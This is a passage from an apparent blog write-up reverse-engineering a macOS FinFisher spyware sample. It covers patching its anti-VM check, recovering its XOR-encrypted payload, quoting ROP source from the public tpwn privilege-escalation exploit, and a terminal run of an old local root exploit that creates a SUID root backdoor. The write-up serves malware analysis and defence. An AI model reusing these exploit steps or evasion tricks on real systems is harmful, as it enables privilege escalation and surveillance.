</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=n>waitUntilExit</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>ret</span> <span class=o>=</span> <span class=p>[</span><span class=n>task</span> <span class=n>terminationStatus</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></div><p>It will essentially execute a shell command via <code>NSTask</code> class. The easiest way to bypass this is to modify the string since the CoreFoundation String (CFString) points to a C string.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__cstring:10002B620 aSystemProfiler db &#39;system_profiler SPUSBDataType | egrep -i &#34;Manufacturer: (parallels|vmware|virtualbox)&#34;&#39;,0
</span></span><span class=line><span class=cl>__cstring:10002B620                       ; DATA XREF: __cfstring:cfstr_SystemProfilerâo
</span></span></code></pre></div><p>If the command doesn&rsquo;t return the information it&rsquo;s looking then whatever test the code is doing will fail and we should bypass the vm detection easily. We just need to overwrite the <code>grep</code> string or modify the shell command to return nothing and exit early.</p><p>In my case I opted to modify the string to <code>"system_profiler SPUSBDataType | egrep -i "Manufacturer: (finfisher clowns u suck aha)""</code>.
For this we don&rsquo;t need a breakpoint since we can modify the memory for the string at the first breakpoint for example, when we bypass the ptrace. Or we can just patch the binary since there are no integrity checks anyway.</p><p>And gone are all anti-debugging and anti-vm checks. That wasn&rsquo;t hard!</p><p>Somewhere in the middle of <code>main</code> code we can find this:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:100001DEF loc_100001DEF:                ; CODE XREF: _main+248âj
</span></span><span class=line><span class=cl>__text:100001DEF    cmp     eax, 0D7F98BB5h
</span></span><span class=line><span class=cl>__text:100001DF4    jnz     loc_100001891
</span></span><span class=line><span class=cl>__text:100001DFA    mov     edi, [rbp+argc] ; argc
</span></span><span class=line><span class=cl>__text:100001E00    mov     rsi, [rbp+argv] ; argv
</span></span><span class=line><span class=cl>__text:100001E07    call    _NSApplicationMain
</span></span><span class=line><span class=cl>__text:100001E0C    mov     [rbp+var_300], eax
</span></span><span class=line><span class=cl>__text:100001E12    mov     eax, 0CDACC4F9h
</span></span><span class=line><span class=cl>__text:100001E17    jmp     loc_100001891
</span></span></code></pre></div></div></div><br><p>This means this is a AppKit application. <code>NSApplicationMain</code> is responsible for creating and running the application. What we have seen until now is just a prologue.</p><p>An astute reader will notice that there is an even easier way to bypass all the previous checks with a single breakpoint. Let me show you how. The prototype for <code>NSApplicationMain</code> is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>NSApplicationMain</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span> <span class=n>_Nonnull</span> <span class=o>*</span><span class=n>argv</span><span class=p>);</span>
</span></span></code></pre></div><p>Since there are no interesting operations in <code>main</code> other than anti-debugging and anti-vm checks, we could simply bypass all that code and set execution directly to <code>NSApplicationMain</code>. The following are the interesting parts of <code>main</code> to achieve this:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:10000174F    push    rbp
</span></span><span class=line><span class=cl>__text:100001750    mov     rbp, rsp
</span></span><span class=line><span class=cl>__text:100001753    push    r15             ; break here
</span></span><span class=line><span class=cl>__text:100001753                            ; and set RIP to 0x100001DFA -.
</span></span><span class=line><span class=cl>(...)                                                                     |
</span></span><span class=line><span class=cl>__text:100001DFA    mov     edi, [rbp+argc] ; argc &lt;----------------------Â´
</span></span><span class=line><span class=cl>__text:100001E00    mov     rsi, [rbp+argv] ; argv
</span></span><span class=line><span class=cl>__text:100001E07    call    _NSApplicationMain
</span></span></code></pre></div></div></div><br><p>We can set a breakpoint at address <code>0x100001753</code> (remember that software breakpoint is triggered before instruction is executed - because the original instruction is replaced with <code>int3</code> instruction) and modify the instruction pointer to address <code>0x100001DFA</code>. We need to do it like this because the arguments are referenced as an offset of the frame pointer register <code>rbp</code>. If we had set the breakpoint at address <code>0x10000174F</code> then the <code>argc</code> reference would be pointing to wrong memory. It is possible to do it this way, we just need to fix the <code>rbp</code> address to the right value (stack grows to lower addresses, so this would be current <code>rsp</code> value - 8). Easier to just breakpoint after the correct <code>rbp</code> is set.</p><p>Now back to tracing post <code>NSApplicationMain</code> execution.</p><p>There is no need to single step execution into <code>NSApplicationMain</code>. There are a series of <a href="https://developer.apple.com/documentation/appkit/nsapplicationdelegate?language=objc">delegates</a> for <code>NSApplication</code> and at least one or two are usually implemented in normal applications. These delegates execute before the real application starts running, so we can breakpoint them to regain debugger control after the call to <code>NSApplicationMain</code>.</p><p>In this case <code>applicationDidFinishLaunching:</code> (<a href="https://developer.apple.com/documentation/appkit/nsapplicationdelegate/1428385-applicationdidfinishlaunching?language=objc">doc</a>) is the only delegate available. Right away we can observe interesting method names that we want to investigate.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:10000275C    push    rbp
</span></span><span class=line><span class=cl>__text:10000275D    mov     rbp, rsp
</span></span><span class=line><span class=cl>__text:100002760    push    r15
</span></span><span class=line><span class=cl>__text:100002762    push    r14
</span></span><span class=line><span class=cl>__text:100002764    push    r13
</span></span><span class=line><span class=cl>__text:100002766    push    r12
</span></span><span class=line><span class=cl>__text:100002768    push    rbx
</span></span><span class=line><span class=cl>__text:100002769    sub     rsp, 18h
</span></span><span class=line><span class=cl>__text:10000276D    mov     rbx, rdi
</span></span><span class=line><span class=cl>__text:100002770    mov     rdi, rdx        ; id
</span></span><span class=line><span class=cl>__text:100002773    call    cs:_objc_retain_ptr
</span></span><span class=line><span class=cl>__text:100002779    call    _objc_autoreleasePoolPush
</span></span><span class=line><span class=cl>__text:10000277E    mov     [rbp+context], rax
</span></span><span class=line><span class=cl>__text:100002782    mov     rsi, cs:selRef_removeOldResource ; SEL
</span></span><span class=line><span class=cl>__text:100002789    mov     r14, cs:_objc_msgSend_ptr
</span></span><span class=line><span class=cl>__text:100002790    mov     rdi, rbx        
</span></span><span class=line><span class=cl>__text:100002793    call    r14 ; _objc_msgSend ; -[appAppDelegate removeOldResource]
</span></span><span class=line><span class=cl>__text:100002796    mov     rsi, cs:selRef_expandPayload ; SEL
</span></span><span class=line><span class=cl>__text:10000279D    mov     rdi, rbx
</span></span><span class=line><span class=cl>__text:1000027A0    call    r14 ; _objc_msgSend ; -[appAppDelegate expandPayload]
</span></span><span class=line><span class=cl>__text:1000027A3    mov     rsi, cs:selRef_executeTrampoline ; SEL
</span></span><span class=line><span class=cl>__text:1000027AA    mov     rdi, rbx
</span></span><span class=line><span class=cl>__text:1000027AD    call    r14 ; _objc_msgSend ; -[appAppDelegate executeTrampoline]
</span></span><span class=line><span class=cl>__text:1000027B0    mov     rsi, cs:selRef_installPayload ; SEL
</span></span><span class=line><span class=cl>__text:1000027B7    mov     rdi, rbx        ; id
</span></span><span class=line><span class=cl>__text:1000027BA    call    r14 ; _objc_msgSend ; -[appAppDelegate installPayload]
</span></span><span class=line><span class=cl>__text:1000027BD    movsx   eax, al
</span></span><span class=line><span class=cl>__text:1000027C0    mov     [rbp+var_2C], eax
</span></span><span class=line><span class=cl>__text:1000027C3    mov     r15, cs:selRef_askUserPermission_
</span></span><span class=line><span class=cl>__text:1000027CA    mov     r12, cs:selRef_installPayload
</span></span><span class=line><span class=cl>__text:1000027D1    mov     eax, 464B731Fh
</span></span><span class=line><span class=cl>__text:1000027D6    jmp     short loc_1000027DD
</span></span></code></pre></div></div></div><br><p>At least two method names look interesting, <code>expandPayload</code> and <code>installPayload</code>. Amnesty report discusses an encrypted payload so this is a good clue and we definitely want to take a look at those methods.</p><p>The <code>removeOldResource</code> method cleans up the temporary payload environment. It uses the <code>+[GIPath compressedPayload]</code> class method to build the temporary path to this payload. On my High Sierra VM, the temporary path is <code>/Users/username/Library/Caches/arch.zip</code>, while in Amnesty report is <code>/tmp/arch.zip</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>id</span> <span class=kr>__cdecl</span> <span class=o>+</span><span class=p>[</span><span class=n>GIPath</span> <span class=n>compressedPayload</span><span class=p>](</span><span class=n>id</span> <span class=n>a1</span><span class=p>,</span> <span class=n>SEL</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>id</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// r14
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// returns @&#34;/Users/username/Library/Caches&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v2</span> <span class=o>=</span> <span class=o>+</span><span class=p>[</span><span class=n>GIPath</span> <span class=n>systemTemp</span><span class=p>](</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___GIPath</span><span class=p>,</span> <span class=s>&#34;systemTemp&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;stringByAppendingPathComponent:&#34;</span><span class=p>,</span> <span class=nf>CFSTR</span><span class=p>(</span><span class=s>&#34;arch.zip&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>objc_release</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>objc_autoreleaseReturnValue</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The path to the extracted payload is built with <code>+[GIPath expandedPayload]</code> class method. In my case <code>/Users/username/Library/Caches/org.logind.ctp.archive</code>.</p><p>More interesting is the <code>expandPayload</code> method. This is where the encrypted payload is decrypted and extracted for later persistence installation in the target system. The encrypted payload is the <code>data</code> file found in <code>Resources</code> folder of the hidden application - <code>ARA0848.app/Contents/Resources/data</code>.</p><p>Without going too much into detail about this method, what it does is to decrypt the <code>data</code> payload to <code>/Users/username/Library/Caches/arch.zip</code> by XOR&rsquo;ing with the key &ldquo;NSString&rdquo;, and then extract that ZIP file to <code>/Users/username/Library/Caches/org.logind.ctp.archive</code>.</p><p>Amnesty released a <a href=https://github.com/AmnestyTech/investigations/tree/master/2020-09-25_finfisher>script</a> to decrypt the payload but I couldn&rsquo;t get it to work. Instead it&rsquo;s just easier to recover the decrypted payload from memory or the extracted version from the filesystem.</p><p>The memory buffer for the decrypted version is allocated here:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:100002F88    call    r12 ; _objc_msgSend ; [NSConcreteData length]
</span></span><span class=line><span class=cl>__text:100002F8B    mov     rdi, rax        ; 0x0000000000158712
</span></span><span class=line><span class=cl>__text:100002F8B                            ; size of data payload (1410834 bytes)
</span></span><span class=line><span class=cl>__text:100002F8E    call    _malloc
</span></span><span class=line><span class=cl>__text:100002F93    mov     [rbp+var_58], rax
</span></span></code></pre></div></div></div><br><p>So we just need to set a breakpoint at address <code>0x100002F93</code>, recover the value of <code>rax</code> register, and find where the decryption loop ends. We can also just find out where it tries to write the buffer to the filesystem and breakpoint there so we can copy it from the filesystem (in this case it&rsquo;s not deleted right away, only later on).</p><p>A good place is here:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:100003080    call    r12 ; _objc_msgSend ; +[GIPath compressedPayload]
</span></span><span class=line><span class=cl>__text:100003083    mov     rdi, rax        ; /Users/username/Library/Caches/arch.zip
</span></span><span class=line><span class=cl>__text:100003086    call    _objc_retainAutoreleasedReturnValue
</span></span><span class=line><span class=cl>__text:10000308B    mov     r15, rax
</span></span><span class=line><span class=cl>__text:10000308E    mov     ecx, 1
</span></span><span class=line><span class=cl>__text:100003093    mov     rdi, r14        ; id
</span></span><span class=line><span class=cl>__text:100003096    mov     rax, cs:selRef_writeToFile_atomically_
</span></span><span class=line><span class=cl>__text:10000309D    mov     rsi, rax        ; SEL
</span></span><span class=line><span class=cl>__text:1000030A0    mov     rdx, r15        ; makes a copy of the decrypted payload here
</span></span><span class=line><span class=cl>__text:1000030A3    call    r12 ; _objc_msgSend ; [OS_dispatch_data writeToFile:atomically:]
</span></span><span class=line><span class=cl>__text:1000030A6    mov     rdi, r15        ; id
</span></span></code></pre></div></div></div><br><p>If we set a breakpoint at <code>0x1000030A6</code> we can just copy the decrypted archive <code>/Users/username/Library/Caches/arch.zip</code> from the filesytem.</p><p>We can now take a peek at the payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>org.logind.ctp.archive
</span></span><span class=line><span class=cl>âââ helper
</span></span><span class=line><span class=cl>âââ helper2
</span></span><span class=line><span class=cl>âââ helper3
</span></span><span class=line><span class=cl>âââ installer
</span></span><span class=line><span class=cl>âââ logind
</span></span><span class=line><span class=cl>âââ logind.kext
</span></span><span class=line><span class=cl>âÂ Â  âââ Contents
</span></span><span class=line><span class=cl>âÂ Â      âââ Info.plist
</span></span><span class=line><span class=cl>âÂ Â      âââ MacOS
</span></span><span class=line><span class=cl>âÂ Â      âÂ Â  âââ logind
</span></span><span class=line><span class=cl>âÂ Â      âââ Resources
</span></span><span class=line><span class=cl>âÂ Â          âââ en.lproj
</span></span><span class=line><span class=cl>âÂ Â              âââ InfoPlist.strings
</span></span><span class=line><span class=cl>âââ logind.plist
</span></span><span class=line><span class=cl>âââ storage.framework
</span></span><span class=line><span class=cl>    âââ Contents
</span></span><span class=line><span class=cl>        âââ Info.plist
</span></span><span class=line><span class=cl>        âââ MacOS
</span></span><span class=line><span class=cl>        âÂ Â  âââ logind
</span></span><span class=line><span class=cl>        âââ PkgInfo
</span></span><span class=line><span class=cl>        âââ Resources
</span></span><span class=line><span class=cl>            âââ 7f.bundle
</span></span><span class=line><span class=cl>            âÂ Â  âââ Contents
</span></span><span class=line><span class=cl>            âÂ Â      âââ Info.plist
</span></span><span class=line><span class=cl>            âÂ Â      âââ MacOS
</span></span><span class=line><span class=cl>            âÂ Â      âÂ Â  âââ 7f
</span></span><span class=line><span class=cl>            âÂ Â      âââ Resources
</span></span><span class=line><span class=cl>            âÂ Â          âââ 7FC.dat
</span></span><span class=line><span class=cl>            âÂ Â          âââ AAC.dat
</span></span><span class=line><span class=cl>            âââ 80C.dat
</span></span><span class=line><span class=cl>            âââ dataPkg
</span></span><span class=line><span class=cl>            âââ logind.plist
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>13</span> directories, <span class=m>19</span> files
</span></span></code></pre></div><p>Amnesty report describes two exploits but this version contains three. All the exploits are public, so no 0days here. Nothing like packaging free work and selling it for big bucks :-].</p><p>The third exploit is a public exploit by qwertyoruiop called <a href=https://github.com/kpwn/tpwn>tpwn</a>. Comparing strings between <code>helper3</code> binary and public source code:</p><p>Helper3</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__cstring:00003ECB aProcUcred      db &#39;_proc_ucred&#39;,0      ; DATA XREF: start+129Câo
</span></span><span class=line><span class=cl>__cstring:00003ED7 aPosixCredGet   db &#39;_posix_cred_get&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003EE7 aChgproccnt     db &#39;_chgproccnt&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003EF3 aIorecursiveloc db &#39;_IORecursiveLockUnlock&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003F0A aZn10ioworkloop db &#39;__ZN10IOWorkLoop8openGateEv&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003F0A                                         ; DATA XREF: start+1DE3âo
</span></span><span class=line><span class=cl>__cstring:00003F26 aZn13ioeventsou db &#39;__ZN13IOEventSource8openGateEv&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003F45 aEscalatingPriv db &#39;Escalating privileges! -qwertyoruiop&#39;,0Ah,0
</span></span><span class=line><span class=cl>__cstring:00003F45                                         ; DATA XREF: start+2138âo
</span></span><span class=line><span class=cl>__cstring:00003F6B aIolog          db &#39;_IOLog&#39;,0           ; DATA XREF: start+2150âo
</span></span><span class=line><span class=cl>__cstring:00003F72 aThreadExceptio db &#39;_thread_exception_return&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003F8B aChmod06777S    db &#39;chmod 06777 %s&#39;,0
</span></span><span class=line><span class=cl>__cstring:00003F9A aChownRootWheel db &#39;chown root:wheel %s&#39;,0
</span></span></code></pre></div></div></div><br><p>Source code</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>RESOLVE_SYMBOL</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>,</span> <span class=s>&#34;_IORecursiveLockUnlock&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_POP_RAX</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=n>heap_info</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>kobject</span><span class=o>+</span><span class=mh>0xe0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_READ_RAX_TO_RAX_POP_RBP</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=n>JUNK_VALUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_RAX_TO_ARG1</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>RESOLVE_SYMBOL</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>,</span> <span class=s>&#34;__ZN10IOWorkLoop8openGateEv&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_POP_RAX</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=n>heap_info</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>kobject</span><span class=o>+</span><span class=mh>0xe8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_READ_RAX_TO_RAX_POP_RBP</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=n>JUNK_VALUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_RAX_TO_ARG1</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span><span class=n>mapping_kernel</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>RESOLVE_SYMBOL</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>,</span> <span class=s>&#34;__ZN13IOEventSource8openGateEv&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>ROP_ARG1</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span> <span class=n>mapping_kernel</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=s>&#34;Escalating privileges! -qwertyoruiop</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>RESOLVE_SYMBOL</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>,</span> <span class=s>&#34;_IOLog&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>PUSH_GADGET</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>=</span> <span class=nf>RESOLVE_SYMBOL</span><span class=p>(</span><span class=n>mapping_kernel</span><span class=p>,</span> <span class=s>&#34;_thread_exception_return&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>They match and they didn&rsquo;t even bother to modify the strings. Pathetic. Pfttttt!</p><p>All the exploits target macOS Yosemite or older, giving another potential clue about how old this version might be. The tpwn exploit is from 2015.</p><p>Let&rsquo;s get back to <code>applicationDidFinishLaunching</code> analysis to understand how the exploits are used. After the payload is decrypted and extracted, the next executed method is <code>executeTrampoline</code>. Another three methods are referenced inside:</p><ul><li>[appAppDelegate isAfterPatch]</li><li>[appAppDelegate launchNewStyle]</li><li>[appAppDelegate launchOldStyle]</li></ul><p>The first to be executed is <code>isAfterPatch</code>. It verifies if the target system is on a given OS release or not. This is used to make the decision to execute new or old style exploits.</p><p>The <code>launchOldStyle</code> tries to execute the <code>helper</code> exploit. If Amnesty <a href=https://www.exploit-db.com/exploits/36739>exploit reference</a> is correct, this is a very old exploit written in 2010, tested against 10.8.X, and apparently fixed in 2013 or 2014.</p><p>We can test the original exploit against a Mountain Lion 10.8.5 VM:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ uname -an
</span></span><span class=line><span class=cl>Darwin mountain-lion-64.local 12.5.0 Darwin Kernel Version 12.5.0: Mon Jul <span class=m>29</span> 16:33:49 PDT 2013<span class=p>;</span> root:xnu-2050.48.11~1/RELEASE_X86_64 x86_64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ clang -o exploit exploit.m -framework Foundation -framework SecurityFoundation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ./exploit /bin/sleep /tmp/backd00r
</span></span><span class=line><span class=cl>Apple MACOS X &lt; 10.9/10? <span class=nb>local</span> root exploit
</span></span><span class=line><span class=cl>by: &lt;mu-b@digit-labs.org&gt;
</span></span><span class=line><span class=cl>http://www.digit-labs.org/ -- Digit-Labs 2010!@<span class=nv>$!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>* Found Authenticator Class!
</span></span><span class=line><span class=cl>* found UserUtilities Class!
</span></span><span class=line><span class=cl>* authenticateUsingAuthorizationSync:authObj returned: <span class=m>1</span>
</span></span><span class=line><span class=cl>* now execute suid backdoor at /tmp/backd00r
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ls -la /tmp/backd00r
</span></span><span class=line><span class=cl>-r-s--x--x  <span class=m>1</span> root  wheel  <span class=m>14080</span> Sep <span class=m>28</span> 03:24 /tmp/backd00r
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ /tmp/backd00r <span class=m>60</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> <span class=m>495</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ps u -p <span class=m>495</span>
</span></span><span class=line><span class=cl>USER   PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
</span></span><span class=line><span class=cl>root   <span class=m>495</span>   0.0  0.0  <span class=m>2432748</span>    <span class=m>464</span> s000  S     3:25AM   0:00.00 /tmp/backd00r <span class=m>60</span>
</span></span></code></pre></div></div></div><br><p>The exploit works as described. The source argument is copied to the selected target and made SUID root.</p><p>The <code>helper</code> binary contains this exploit in <code>do_assistive_copy</code> function but will ask for user permission if exploit fails. This good old social engineering dialog happens at <code>do_ask_user_permission</code> function.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>nm</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ nm helper -s __TEXT __text 
</span></span><span class=line><span class=cl>(...)
</span></span><span class=line><span class=cl>0000000100003277 t _do_ask_user_permission
</span></span><span class=line><span class=cl>0000000100002470 t _do_assistive_copy
</span></span><span class=line><span class=cl>(...)
</span></span></code></pre></div></div></div><br><p>Let&rsquo;s get back to <code>launchOldStyle</code> method to understand how <code>helper</code> is called.</p><p>The Objective-C code is something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>NSNumber</span> <span class=o>*</span><span class=n>perm</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSNumber</span> <span class=nl>numberWithUnsignedLong</span><span class=p>:</span><span class=mo>0755</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>NSNumber</span> <span class=o>*</span><span class=n>user</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSNumber</span> <span class=nl>numberWithUnsignedLong</span><span class=p>:</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>NSNumber</span> <span class=o>*</span><span class=n>group</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSNumber</span> <span class=nl>numberWithUnsignedLong</span><span class=p>:</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NSDictionary</span> <span class=o>*</span><span class=n>attr</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSDictionary</span> <span class=nl>dictionaryWithObjectsAndKeys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>perm</span><span class=p>,</span> <span class=n>NSFilePosixPermissions</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=n>user</span><span class=p>,</span> <span class=n>NSFileOwnerAccountID</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=n>group</span><span class=p>,</span> <span class=n>NSFileGroupOwnerAccountID</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=n>nil</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NSFileManager</span> <span class=o>*</span><span class=n>fm</span> <span class=o>=</span> <span class=p>[[</span><span class=n>NSFilemanager</span> <span class=n>alloc</span><span class=p>]</span> <span class=n>init</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=c1>// returns path to extracted zip payload + helper
